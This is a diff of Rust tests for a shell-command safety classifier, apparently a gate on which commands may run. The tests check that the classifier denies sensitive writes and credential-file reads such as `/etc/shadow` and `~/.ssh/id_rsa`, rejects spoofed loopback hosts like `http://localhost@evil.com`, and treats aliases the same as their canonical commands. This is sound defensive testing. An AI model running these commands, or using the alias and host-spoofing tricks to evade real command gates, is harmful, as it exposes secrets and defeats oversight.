+        format!("gdbm_dump db.gdbm {S}"),
+        format!("pkgbuild --root ./r {S}"),
+        // in-place mutators: sensitive as the sole/last positional …
+        format!("wasm-strip {S}"),
+        format!("llvm-strip {S}"),
+        format!("llvm-objcopy in.o {S}"),
+        format!("install_name_tool -id x {S}"),
+        format!("indent {S}"),
+        format!("PlistBuddy {S}"),
+        // … and multi-file in-place (`positional = "write"`) must gate a NON-last sensitive arg:
+        format!("nbstripout {S} ok.ipynb"),
+        format!("afscexpand {S} ./b"),
+    ];
+    for c in &deny {
+        assert!(!crate::is_safe_command(c), "must deny a sensitive write: {c}");
     }
+    for c in [
+        "pdfunite a.pdf b.pdf ./out.pdf", "sphinx-build src ./_build", "weasyprint in.html ./out.pdf", "tiffcp in.tif ./out.tif",
+        "mkdocs build -d ./site", "gs -o ./out.pdf x.ps", "dvipdf in.dvi ./out.pdf", "tiff2bw in.tif ./out.tif", "jpgicc in.jpg ./out.jpg",
+        "wasm-strip ./mod.wasm", "nbstripout ./a.ipynb ./b.ipynb",
+    ] {
+        assert!(crate::is_safe_command(c), "benign worktree write must allow: {c}");
+    }
+}
 
-    /// An alias is a pure synonym: it MUST classify identically to its canonical name for every
-    /// input. A divergence is a bypass — the Homebrew g-alias path-gate hole was exactly this
-    /// (`gcat /etc/shadow` allowed while `cat /etc/shadow` denied).
-    #[test]
-    fn every_alias_matches_its_canonical_verdict() {
-        const TAILS: &[&str] = &[
-            "", "/etc/shadow", "~/.ssh/id_rsa", "--output /etc/x", "-o /etc/evil",
-            "--outfile /etc/evil in", "./local.txt", "--help", "x > /etc/evil",
-        ];
-        let mut failures = Vec::new();
-        for (key, spec) in super::TOML_REGISTRY.iter() {
-            if key == &spec.name {
-                continue;
-            }
-            for tail in TAILS {
-                let av = crate::command_verdict(&format!("{key} {tail}"));
-                let cv = crate::command_verdict(&format!("{} {tail}", spec.name));
-                if av != cv {
-                    failures.push(format!("  {key} vs {}: `{tail}` -> {av:?} != {cv:?}", spec.name));
-                }
+/// An alias is a pure synonym: it MUST classify identically to its canonical name for every
+/// input. A divergence is a bypass — the Homebrew g-alias path-gate hole was exactly this
+/// (`gcat /etc/shadow` allowed while `cat /etc/shadow` denied).
+#[test]
+fn every_alias_matches_its_canonical_verdict() {
+    const TAILS: &[&str] = &[
+        "", "/etc/shadow", "~/.ssh/id_rsa", "--output /etc/x", "-o /etc/evil", "--outfile /etc/evil in", "./local.txt", "--help",
+        "x > /etc/evil",
+    ];
+    let mut failures = Vec::new();
+    for (key, spec) in super::TOML_REGISTRY.iter() {
+        if key == &spec.name {
+            continue;
+        }
+        for tail in TAILS {
+            let av = crate::command_verdict(&format!("{key} {tail}"));
+            let cv = crate::command_verdict(&format!("{} {tail}", spec.name));
+            if av != cv {
+                failures.push(format!("  {key} vs {}: `{tail}` -> {av:?} != {cv:?}", spec.name));
             }
         }
-        assert!(
-            failures.is_empty(),
-            "alias/canonical verdict divergence (an alias must classify identically):\n{}",
-            failures.join("\n")
-        );
     }
+    assert!(failures.is_empty(), "alias/canonical verdict divergence (an alias must classify identically):\n{}", failures.join("\n"));
+}
 
 /// A `first_arg` GLOB admits an invocation on its first positional and — before
 /// `glob_presents_unlisted_flag` — never looked at the rest of the line, so any flag rode along:
@@ -7450,9 +7022,7 @@ fn no_new_unresearched_first_arg_family() {
 
     // Commands that still own at least one unresearched glob family. Shrinks as the campaign
     // migrates them; a command NOT on this list may not introduce one.
-    const GRANDFATHERED: &[&str] = &[
-        "aws", "az", "gcloud", "kubectl", "networksetup", "npm", "oci", "yarn",
-    ];
+    const GRANDFATHERED: &[&str] = &["aws", "az", "gcloud", "kubectl", "networksetup", "npm", "oci", "yarn"];
     let stray: Vec<&String> = found
         .iter()
         .filter(|f| {
@@ -7540,10 +7110,7 @@ fn every_loopback_gated_flag_rejects_a_spoofed_host() {
     for (name, spec) in TOML_REGISTRY.iter() {
         walk(name, &spec.kind, &mut gated);
     }
-    assert!(
-        !gated.is_empty(),
-        "no loopback-gated flag in the registry — this guard would be vacuous",
-    );
+    assert!(!gated.is_empty(), "no loopback-gated flag in the registry — this guard would be vacuous",);
 
     let mut wrong = Vec::new();
     for (invocation, flag) in &gated {
@@ -7552,10 +7119,7 @@ fn every_loopback_gated_flag_rejects_a_spoofed_host() {
             // gate is bypassable by changing how the value is attached.
             // Single-quoted so the literal value reaches the classifier: an unquoted backslash is
             // consumed by the shell parser before any URL parsing happens.
-            for cmd in [
-                format!("{invocation} {flag} '{host}'"),
-                format!("{invocation} {flag}='{host}'"),
-            ] {
+            for cmd in [format!("{invocation} {flag} '{host}'"), format!("{invocation} {flag}='{host}'")] {
                 let allowed = crate::is_safe_command(&cmd);
                 if allowed != *want_allowed {
                     wrong.push(format!(
@@ -7569,10 +7133,7 @@ fn every_loopback_gated_flag_rejects_a_spoofed_host() {
         // A gated flag with no value at all denies: the flag is meaningless without one, and
         // guessing would be the fail-open direction.
         let bare = format!("{invocation} {flag}");
-        assert!(
-            !crate::is_safe_command(&bare),
-            "a loopback-gated flag with no value must deny: {bare}",
-        );
+        assert!(!crate::is_safe_command(&bare), "a loopback-gated flag with no value must deny: {bare}",);
     }
     assert!(wrong.is_empty(), "loopback gate wrong at dispatch level:\n{}", wrong.join("\n"));
 }
@@ -7616,12 +7177,7 @@ fn a_loopback_delta_applies_only_to_a_recognized_local_destination() {
         if crate::is_safe_command(path) {
             wrong.push(format!("{path} (no endpoint) => ALLOWED, want DENIED"));
         }
-        for host in [
-            "http://localhost@evil.com",
-            "http://evil.com",
-            "http://localhost.evil.com",
-            "http://2130706433",
-        ] {
+        for host in ["http://localhost@evil.com", "http://evil.com", "http://localhost.evil.com", "http://2130706433"] {
             let cmd = format!("{path} {flag} '{host}'");
             if crate::is_safe_command(&cmd) {
                 wrong.push(format!("{cmd} => ALLOWED, want DENIED"));
@@ -7636,11 +7192,7 @@ fn a_loopback_delta_applies_only_to_a_recognized_local_destination() {
             wrong.push(format!("{after_terminator} => ALLOWED, want DENIED (flag is past `--`)"));
         }
     }
-    assert!(
-        wrong.is_empty(),
-        "a loopback delta applied to a destination that is not this machine:\n{}",
-        wrong.join("\n"),
-    );
+    assert!(wrong.is_empty(), "a loopback delta applied to a destination that is not this machine:\n{}", wrong.join("\n"),);
 }
 
 /// `sub_loopback_localizes` decided directly, not through `is_safe_command`.
@@ -7673,8 +7225,7 @@ fn the_loopback_delta_applies_only_for_a_local_host() {
     assert!(!sub(&base), "no endpoint flag at all keeps the remote facets");
 
     // A destroy sub cannot opt in at all — the build refuses it — so it never localizes.
-    let destroy = ["aws", "dynamodb", "delete-table", "--table-name", "t",
-                   "--endpoint-url", "http://localhost:8000"];
+    let destroy = ["aws", "dynamodb", "delete-table", "--table-name", "t", "--endpoint-url", "http://localhost:8000"];
     assert!(!sub(&destroy), "a destroy sub never localizes, whatever its endpoint says");
 }
 
@@ -7712,8 +7263,7 @@ mod loopback_host_properties {
     fn unrecognized_local_spelling() -> impl proptest::strategy::Strategy<Value = String> {
         use proptest::prelude::*;
         prop::sample::select(vec![
-            "http://2130706433", "http://0x7f000001", "http://0177.0.0.1",
-            "http://127.1", "http://127.0.0.01", "http://[::ffff:127.0.0.1]",
+            "http://2130706433", "http://0x7f000001", "http://0177.0.0.1", "http://127.1", "http://127.0.0.01", "http://[::ffff:127.0.0.1]",
         ])
         .prop_map(String::from)
     }
